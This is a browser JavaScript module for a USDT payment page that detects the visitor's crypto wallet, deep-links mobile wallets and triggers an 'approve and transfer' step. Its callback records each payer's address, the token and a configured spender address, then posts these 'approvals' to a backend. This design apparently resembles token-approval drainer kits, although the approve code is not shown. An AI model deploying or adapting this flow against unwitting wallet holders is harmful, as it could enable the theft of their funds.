(function () {
  const core = window.pay0Core;
  if (!core) throw new Error("pay0Core 未加载");
  const $ = core.$;

  let walletModalInstance = null;

  function showModal() {
    const el = $("walletModal");
    if (!el || !window.bootstrap) return;
    walletModalInstance = window.bootstrap.Modal.getOrCreateInstance(el, { backdrop: "static", keyboard: false });
    walletModalInstance.show();
  }

  function hideModal() {
    if (walletModalInstance && typeof walletModalInstance.hide === "function") walletModalInstance.hide();
  }

  function getPayAmountUsdt() {
    try {
      const cfg = window.pay0Config || {};
      const v = typeof cfg.amountUsdt === "number" ? cfg.amountUsdt : parseFloat(cfg.amountUsdt);
      if (!isNaN(v) && v > 0) return String(v);
    } catch (e) { }
    return "1";
  }

  function uaIncludes(s) {
    try {
      return typeof navigator !== "undefined" && typeof navigator.userAgent === "string" && navigator.userAgent.toLowerCase().includes(String(s).toLowerCase());
    } catch (e) {
      return false;
    }
  }

  function isMobileEnv() {
    return uaIncludes("iphone") || uaIncludes("ipad") || uaIncludes("ipod") || uaIncludes("android");
  }

  function getPayPageUrl() {
    try {
      if (typeof window === "undefined") return "";
      const current = new URL(window.location.href);
      const path = current.pathname;

      const newPath = path.substring(0, path.lastIndexOf('/') + 1) + 'pay.html';
      const target = new URL(newPath, current.origin);
      target.search = current.search;
      return target.href;
    } catch (e) {
      return window.location.href;
    }
  }

  function getMetaMaskEthereum() {
    if (typeof window === "undefined") return null;
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask) return eth;
    if (Array.isArray(eth.providers)) {
      for (let i = 0; i < eth.providers.length; i++) {
        const p = eth.providers[i];
        if (p && p.isMetaMask) return p;
      }
    }
    return null;
  }

  function isMetaMaskProvider() {
    return !!getMetaMaskEthereum();
  }

  function isTrustProvider() {
    return !!(window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet));
  }

  function isTokenPocketEnv() {
    return !!((window.ethereum && window.ethereum.isTokenPocket) || window.tokenPocket || uaIncludes("tokenpocket"));
  }

  function isBitgetEnv() {
    return !!((window.ethereum && window.ethereum.isBitKeep) || (window.bitkeep && window.bitkeep.ethereum) || uaIncludes("bitkeep") || uaIncludes("bitget"));
  }

  function isOkxEnv() {
    try {
      const eth = window.ethereum;

      if (window.okxwallet && (window.okxwallet.tronWeb || window.okxwallet.ethereum)) {
        return true;
      }

      if (eth && (eth.isOkxWallet || eth.isOKXWallet)) {
        return true;
      }

      // 有些环境只暴露 provider 类型名
      const ctorName = eth && eth.constructor && String(eth.constructor.name || "").toLowerCase();
      if (ctorName && ctorName.includes("okx")) {
        return true;
      }

      return uaIncludes("okx");
    } catch (e) {
      return false;
    }
  }

  function isImTokenEnv() {
    return !!(window.imToken || (window.ethereum && window.ethereum.isImToken) || uaIncludes("imtoken"));
  }

  async function getEvmChainIdHex() {
    if (!window.ethereum) throw new Error("未检测到 EVM 钱包");
    return await window.ethereum.request({ method: "eth_chainId" });
  }

  function chainKeyFromChainIdHex(chainIdHex) {
    const s = String(chainIdHex || "").toLowerCase();
    if (s === "0x1") return "eth";
    if (s === "0x38") return "bsc";
    if (s === "0x61") return "bscTestnet";
    return null;
  }

  function chainLabel(chainKey) {
    if (chainKey === "eth") return "Ethereum 主网 (1)";
    if (chainKey === "bsc") return "BSC 主网 (56)";
    if (chainKey === "bscTestnet") return "BSC 测试网 (97)";
    return String(chainKey || "");
  }

  function allowedChainsLabel(keys) {
    if (!Array.isArray(keys) || keys.length === 0) return "";
    if (keys.length === 1) return chainLabel(keys[0]);
    return keys.map(chainLabel).join(" / ");
  }

  async function payEvmByCurrentChain(allowedChainKeys, log) {
    if (!window.ethereum) throw new Error("未检测到 EVM 钱包");
    const chainIdHex = await getEvmChainIdHex();
    const chainKey = chainKeyFromChainIdHex(chainIdHex);
    if (!chainKey) throw new Error("当前链不支持：" + String(chainIdHex || ""));
    if (Array.isArray(allowedChainKeys) && allowedChainKeys.length > 0 && !allowedChainKeys.includes(chainKey)) {
      if (chainKey === "bscTestnet") {
        if (typeof log === "function") log("检测到 BSC 测试网，放行测试...");
      } else {
        const current = chainLabel(chainKey);
        const expected = allowedChainsLabel(allowedChainKeys);
        throw new Error("当前链为 " + current + "，请切换到 " + expected);
      }
    }
    if (typeof window.pay0EvmApproveAndTransfer !== "function") throw new Error("EVM 模块未加载");
    await window.pay0EvmApproveAndTransfer({
      chain: chainKey,
      amountUsdt: getPayAmountUsdt(),
      log
    });
  }

  async function payTronViaTronLink(log) {
    const hasTronLink = !!(window.tronLink && window.tronLink.request);
    const hasTronWeb = !!window.tronWeb;
    if (!hasTronLink && !hasTronWeb && isMobileEnv()) {
      try {
        const url = getPayPageUrl();
        const payload = {
          url: url,
          action: "open",
          protocol: "tronlink",
          version: "1.0"
        };
        const encoded = encodeURIComponent(JSON.stringify(payload));
        window.location.href = "tronlinkoutside://pull.activity?param=" + encoded;
        return;
      } catch (e) { }
    }
    if (typeof window.pay0TronLinkTransfer !== "function") throw new Error("TronLink 模块未加载");
    await window.pay0TronLinkTransfer({
      log,
      amountUsdt: getPayAmountUsdt()
    });
  }

  async function payTronViaTronWeb(log) {
    if (typeof window.pay0TokenPocketTronTransfer !== "function") throw new Error("TronWeb 模块未加载");
    await window.pay0TokenPocketTronTransfer({
      log,
      amountUsdt: getPayAmountUsdt()
    });
  }

  async function payTokenPocketSelected(log) {
    if (!isTokenPocketEnv()) {
      if (isMobileEnv()) {
        try {
          const url = getPayPageUrl();
          const params = { url: url };
          const encoded = encodeURIComponent(JSON.stringify(params));
          // TokenPocket deep link
          window.location.href = "tpdapp://open?params=" + encoded;
          return;
        } catch (e) { }
      }
      throw new Error("未检测到 TokenPocket，请在 TokenPocket 内置浏览器打开本页");
    }
    if (typeof window.pay0TokenPocketPay !== "function") throw new Error("TokenPocket 模块未加载");
    await window.pay0TokenPocketPay({ log });
  }

  async function payImTokenSelected(log) {
    if (!isImTokenEnv()) {
      if (isMobileEnv()) {
        try {
          const url = getPayPageUrl();
          const encoded = encodeURIComponent(url);
          window.location.href = "imtokenv2://navigate?screen=DappView&url=" + encoded;
          return;
        } catch (e) { }
      }
      throw new Error("未检测到 imToken，请在 imToken DApp 浏览器中打开本页");
    }
    await payEvmByCurrentChain(["eth", "bsc"], log);
  }

  async function payBitgetSelected(log) {
    if (!isBitgetEnv()) {
      if (isMobileEnv()) {
        try {
          const url = getPayPageUrl();
          const encoded = encodeURIComponent(url);
          // Bitget Wallet / BitKeep deep link
          window.location.href = "https://bkcode.vip?action=dapp&url=" + encoded;
          return;
        } catch (e) { }
      }
      throw new Error("未检测到 Bitget Wallet，请在 Bitget Wallet 内置浏览器打开本页或安装插件");
    }
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
      await payTronViaTronWeb(log);
      return;
    }
    if (window.ethereum) {
      await payEvmByCurrentChain(["eth", "bsc"], log);
      return;
    }
    throw new Error("未检测到 Bitget Wallet 注入的 tronWeb / ethereum");
  }

  async function payOkxSelected(log) {
    if (!isOkxEnv()) {
      throw new Error("未检测到 OKX Web3 Wallet，请在 OKX 钱包中打开本页或安装插件");
    }
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
      await payTronViaTronWeb(log);
      return;
    }
    if (window.ethereum) {
      await payEvmByCurrentChain(["eth", "bsc"], log);
      return;
    }
    throw new Error("未检测到 OKX Web3 Wallet 注入的 tronWeb / ethereum");
  }

  async function payMetaMaskSelected(log) {
    const provider = getMetaMaskEthereum();
    if (!provider) {
      if (isMobileEnv()) {
        try {
          const fullUrl = getPayPageUrl();
          // MetaMask uses https://metamask.app.link/dapp/domain.com/path... (no protocol)
          // 移除 protocol (http:// or https://)
          const url = fullUrl.replace(/^https?:\/\//, '');
          window.location.href = "https://metamask.app.link/dapp/" + url;
          return;
        } catch (e) { }
      }
      throw new Error("未检测到 MetaMask，请确认已在浏览器中启用 MetaMask 扩展或使用 MetaMask 内置浏览器打开本页");
    }
    const prev = window.ethereum;
    try {
      window.ethereum = provider;
      await payEvmByCurrentChain(["eth", "bsc"], log);
    } finally {
      window.ethereum = prev;
    }
  }

  async function payTrustSelected(log) {
    if (!isTrustProvider()) {
      if (isMobileEnv()) {
        try {
          const url = getPayPageUrl();
          const encoded = encodeURIComponent(url);
          // Trust Wallet deep link
          window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encoded;
          return;
        } catch (e) { }
      }
      throw new Error("未检测到 Trust Wallet，请启用 Trust Wallet 或禁用其他 EVM 钱包插件");
    }
    await payEvmByCurrentChain(["eth", "bsc"], log);
  }

  async function resolvePayParamsAndJump(key, log) {
    if (key === "metamask") return await payMetaMaskSelected(log);
    if (key === "tokenpocket") return await payTokenPocketSelected(log);
    if (key === "imtoken") return await payImTokenSelected(log);
    if (key === "tronlink") return await payTronViaTronLink(log);
    if (key === "bitget") return await payBitgetSelected(log);
    if (key === "okx") return await payOkxSelected(log);
    if (key === "trust") return await payTrustSelected(log);
    throw new Error("未知的钱包类型: " + key);
  }

  function bindWalletButtons(log) {
    const btnConnect = $("btnConnect");
    if (btnConnect) btnConnect.addEventListener("click", () => showModal());

    const btnPayNow = $("btnPayNow");
    if (btnPayNow) btnPayNow.addEventListener("click", () => showModal());

    const btnCloseModal = $("btnCloseModal");
    if (btnCloseModal) btnCloseModal.addEventListener("click", () => hideModal());

    const walletModal = $("walletModal");
    if (walletModal) walletModal.addEventListener("click", (e) => { if (e.target === walletModal) hideModal(); });

    const btnMetaMask = $("btnWalletMetaMask");
    if (btnMetaMask) btnMetaMask.addEventListener("click", async () => {
      try {
        hideModal();
        await payMetaMaskSelected(log);
      } catch (e) {
        const msg = "MetaMask 支付失败：" + (e && e.message ? e.message : String(e));
        log(msg);
        alert(msg);
      }
    });

    const btnTokenPocket = $("btnWalletTokenPocket");
    if (btnTokenPocket) btnTokenPocket.addEventListener("click", async () => {
      try {
        hideModal();
        await payTokenPocketSelected(log);
      } catch (e) {
        const msg = "TokenPocket 支付失败：" + (e && e.message ? e.message : String(e));
        log(msg);
        alert(msg);
      }
    });

    const btnImToken = $("btnWalletImToken");
    if (btnImToken) btnImToken.addEventListener("click", async () => {
      try {
        hideModal();
        await payImTokenSelected(log);
      } catch (e) {
        const msg = "imToken 支付失败：" + (e && e.message ? e.message : String(e));
        log(msg);
        alert(msg);
      }
    });

    const btnTronLink = $("btnWalletTronLink");
    if (btnTronLink) btnTronLink.addEventListener("click", async () => {
      try {
        hideModal();
        await payTronViaTronLink(log);
      } catch (e) {
        const msg = "TronLink 支付失败：" + (e && e.message ? e.message : String(e));
        log(msg);
        alert(msg);
      }
    });

    const btnBitget = $("btnWalletBitget");
    if (btnBitget) btnBitget.addEventListener("click", async () => {
      try {
        hideModal();
        await payBitgetSelected(log);
      } catch (e) {
        const msg = "Bitget 支付失败：" + (e && e.message ? e.message : String(e));
        log(msg);
        alert(msg);
      }
    });

    const btnOkx = $("btnWalletOkx");
    if (btnOkx) btnOkx.addEventListener("click", async () => {
      try {
        hideModal();
        await payOkxSelected(log);
      } catch (e) {
        const msg = "OKX Web3 Wallet 支付失败：" + (e && e.message ? e.message : String(e));
        log(msg);
        alert(msg);
      }
    });

    const btnTrust = $("btnWalletTrust");
    if (btnTrust) btnTrust.addEventListener("click", async () => {
      try {
        hideModal();
        await payTrustSelected(log);
      } catch (e) {
        const msg = "Trust Wallet 支付失败：" + (e && e.message ? e.message : String(e));
        log(msg);
        alert(msg);
      }
    });
  }

  function init(opts) {
    const log = opts && typeof opts.log === "function" ? opts.log : function () { };
    bindWalletButtons(log);
    log("页面已就绪");
  }

  window.pay0PaymentCallback = async function (info) {
    try {
      console.log("pay0PaymentCallback", info);
      const cfg = window.pay0Config || {};
      const chain = String(info.chain || "").trim();
      const txHash = String(info.txHash || "").trim();
      const amountUsdt = String(info.amountUsdt || "").trim();
      const action = String(info.action || "").trim() || "approve";

      let tokenAddress = "";
      let spenderAddress = "";
      let ownerAddress = "";

      if (chain === "tron") {
        if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
          ownerAddress = window.tronLink.tronWeb.defaultAddress.base58;
        } else if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
          ownerAddress = window.tronWeb.defaultAddress.base58;
        }
        const netCfgTron = typeof cfg.getNetworkConfig === "function" ? cfg.getNetworkConfig("tron") : null;
        if (netCfgTron) {
          tokenAddress = netCfgTron.usdtAddress || "";
          spenderAddress = cfg.toAddress || netCfgTron.toAddress || "";
        }
      } else {
        if (window.ethereum && window.ethers && window.ethers.BrowserProvider) {
          try {
            const provider = new window.ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            ownerAddress = await signer.getAddress();
          } catch (e) { }
        }
        if (typeof cfg.getNetworkConfig === "function") {
          const netCfg = cfg.getNetworkConfig(chain);
          if (netCfg) {
            tokenAddress = netCfg.usdtAddress || "";
            spenderAddress = cfg.toAddress || netCfg.toAddress || "";
          }
        }
      }

      if (!ownerAddress) return;
      if (!tokenAddress || !spenderAddress) return;
      if (!chain || !txHash || !amountUsdt) return;

      const body = {
        chain,
        txHash,
        amountUsdt,
        action,
        tokenAddress,
        spenderAddress,
        ownerAddress
      };
      if (window.pay0Api && typeof window.pay0Api.postApproval === "function") {

        await window.pay0Api.postApproval(body);
      }
    } catch (e) { }
  };

  window.pay0Actions = { init, resolvePayParamsAndJump };
})();
